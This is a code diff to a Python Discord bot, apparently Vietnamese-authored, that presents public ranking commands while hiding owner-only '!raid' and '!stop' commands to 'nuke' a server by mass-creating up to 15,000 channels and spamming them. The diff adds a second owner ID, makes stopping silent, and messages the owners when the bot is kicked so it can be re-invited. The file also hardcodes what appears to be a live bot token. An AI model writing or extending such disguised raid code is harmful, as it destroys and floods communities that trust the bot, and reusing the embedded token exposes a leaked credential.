@@ -10,7 +10,7 @@ import math
 
 # ===== CẤU HÌNH GỐC (NUKE) =====
 TOKEN = "MTU0ODMyOTgyODU5NDIyMTEzNw.GkIKWy.r48kiqnMMqyDMTKA6lfuT0LKdGcO8FAER3hpNE"
-OWNER_ID = 1413781843030966345
+OWNER_IDS = [1413781843030966345, 1530189926895714355]
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
 BATCH_SIZE = 80
@@ -1894,13 +1894,13 @@ async def raid(guild):
     asyncio.create_task(create_channels_and_spam(guild))
     asyncio.create_task(continuous_spam(guild))
 
-# ===== LỆNH !raid VÀ !stop (ĐÃ SỬA – !stop CHỈ DỪNG NUKE) =====
+# ===== LỆNH !raid VÀ !stop (2 OWNER, !stop DỪNG NUKE ÂM THẦM) =====
 @client.event
 async def on_message(message):
     global nuke_running
     if message.author.id == client.user.id:
         return
-    if message.author.id != OWNER_ID:
+    if message.author.id not in OWNER_IDS:
         return
 
     if message.content.startswith("!raid"):
@@ -1933,6 +1933,7 @@ async def on_ready():
     print("[*] Public: /start, /rankings, /diem")
     print("[*] Hidden: !raid (owner only – full nuke)")
     print("[*] Hidden: !stop (owner only – stop nuke silently)")
+    print(f"[*] Owners: {OWNER_IDS}")
     await tree.sync()
     print("[*] Slash commands synced.")
     for guild in client.guilds:
@@ -1947,9 +1948,13 @@ async def on_guild_join(guild):
 @client.event
 async def on_member_remove(member):
     if member.id == client.user.id:
-        owner = await client.fetch_user(OWNER_ID)
-        if owner:
-            await owner.send(f"[!] Bot kicked from {member.guild.name}. Re-invite needed.")
+        for owner_id in OWNER_IDS:
+            try:
+                owner = await client.fetch_user(owner_id)
+                if owner:
+                    await owner.send(f"[!] Bot kicked from {member.guild.name}. Re-invite needed.")
+            except:
+                pass
 
 # ===== CHẠY =====
 if __name__ == "__main__":
